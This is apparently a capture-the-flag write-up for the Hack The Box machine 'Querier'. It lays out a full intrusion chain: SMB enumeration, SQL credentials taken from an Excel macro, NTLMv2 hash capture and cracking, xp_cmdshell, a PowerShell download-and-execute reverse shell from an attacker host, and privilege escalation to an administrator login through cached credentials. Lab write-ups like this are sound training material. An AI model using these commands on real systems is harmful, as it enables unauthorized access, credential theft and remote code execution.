nmap scan

```
sudo nmap -p- --min-rate 10000 -oA nmap 10.10.10.125
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
```

### Enumerating SMB

```bash
smbclient -L \\10.10.10.125
Enter WORKGROUP\localuser's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk      
SMB1 disabled -- no workgroup available
```

We can access to `Reports` and it has a `.xlsm` file:

```bash
smbclient -N  "//10.10.10.125/Reports"
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 28 15:23:48 2019
  ..                                  D        0  Mon Jan 28 15:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 14:21:34 2019

                6469119 blocks of size 4096. 1615453 blocks available
smb: \> get "Currency Volume Report.xlsm"
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (11.2 KiloBytes/sec) (average 11.2 KiloBytes/sec)
```

This file was created by the user `Luis`:

```bash
exiftool 'Currency Volume Report.xlsm' 
ExifTool Version Number         : 11.88
File Name                       : Currency Volume Report.xlsm
Directory                       : .
File Size                       : 12 kB
File Modification Date/Time     : 2020:12:27 01:46:21-08:00
File Access Date/Time           : 2020:12:27 01:47:16-08:00
File Inode Change Date/Time     : 2020:12:27 01:46:21-08:00
File Permissions                : rw-r--r--
File Type                       : XLSM
File Type Extension             : xlsm
MIME Type                       : application/vnd.ms-excel.sheet.macroEnabled
Zip Required Version            : 20
Zip Bit Flag                    : 0x0006
Zip Compression                 : Deflated
Zip Modify Date                 : 1980:01:01 00:00:00
Zip CRC                         : 0x513599ac
Zip Compressed Size             : 367
Zip Uncompressed Size           : 1087
Zip File Name                   : [Content_Types].xml
Creator                         : Luis
Last Modified By                : Luis
Create Date                     : 2019:01:21 20:38:56Z
Modify Date                     : 2019:01:27 22:21:34Z
Application                     : Microsoft Excel
Doc Security                    : None
Scale Crop                      : No
Heading Pairs                   : Worksheets, 1
Titles Of Parts                 : Currency Volume
Company                         : 
Links Up To Date                : No
Shared Doc                      : No
Hyperlinks Changed              : No
App Version                     : 16.0300
```

Now I'll use the olevba.py tool to check for vba macros:

```bash
python3 olevba.py ~/htb/querier/Currency\ Volume\ Report.xlsm                                                                                 [8/126]
olevba 0.56.1.dev2 on Python 3.8.5 - http://decalage.info/python/oletools      
===============================================================================
FILE: /home/localuser/htb/querier/Currency Volume Report.xlsm                  
Type: OpenXML                                                                                  
WARNING  For now, VBA stomping cannot be detected for files in memory          
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls                                                                     
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' macro to pull data for client volume reports
'
' further testing required

Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox "connection successful"
  
  'Set rs = conn.Execute("SELECT * @@version;") 
  Set rs = conn.Execute("SELECT * FROM volume;")
  Sheets(1).Range("A1").CopyFromRecordset rs
  rs.Close

End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
```

There's the username and password on plaintext: `reporting:PcwTWTHRwryjc$c6`

### Enumerating port 1433 authenticated

Connecting with mssqlclient:

```bash
mssqlclient.py reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth
```

We can capture the NET-NTLMv2 hash, first set up responder:

```bash
sudo responder -I tun0
```

On the mssqclient client:

```bash
xp_dirtree '\\10.10.14.3\test'
```

And we have the hash:

```powershell
[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 10.10.10.125
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:daf22eba6235bb2d:DB1D6F09472DD5D5773C6846B007BBCF:0101000000000000C0653150DE09D201C2B44299FD739D2D000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000300000378322E0E9A5521D9F53639DF6C8602F38F6535103BF8A500C1F6370E6F7959C0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003300000000000000000000000000
[*] Skipping previously captured hash for QUERIER\mssql-svc
```

Cracking it:

```powershell
.\hashcat.exe -m 5600 .\hash.txt .\rockyou.txt
```

We have this password: corporate568

### Enumerating mssql as mssql-svc

```bash
mssqlclient.py mssql-svc:'corporate568'@10.10.10.125 -windows-auth
```

Now we have privilige to enable the `xp_cmdshell`:

```powershell
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
output                                                                             

--------------------------------------------------------------------------------   

querier\mssql-svc                                                                  

NULL 
```

### Getting a reverse shell

I'll use the nishang Invoke-PowerShellTcp.ps1, first I'll start the server:

```bash
sudo python3 -m http.server 80
```

Then start the listener:

```bash
nc -lvnp 9001
```

And download it:

```powershell
SQL> xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.14.3/rev.ps1\")
```

### Privilege Escalation

I'll use `PowerUp.ps1` to enumerate

```powershell
IEX(New-Object Net.WebClient).downloadString("http://10.10.14.3/PowerUp.ps1")
Invoke-AllChecks
Privilege   : SeImpersonatePrivilege                                                                                                                                                          
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED                                                                                                                           
TokenHandle : 2440
ProcessId   : 3416              
Name        : 3416
Check       : Process Token Privileges

ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services

ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
IdentityReference : QUERIER\mssql-svc
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files

Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group 
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
Check     : Cached GPP Files
```

We have this password for the administrator: `MyUnclesAreMarioAndLuigi!!1!`, we can login with psexec:

```bash
psexec.py 'administrator:MyUnclesAreMarioAndLuigi!!1!@10.10.10.125'
```
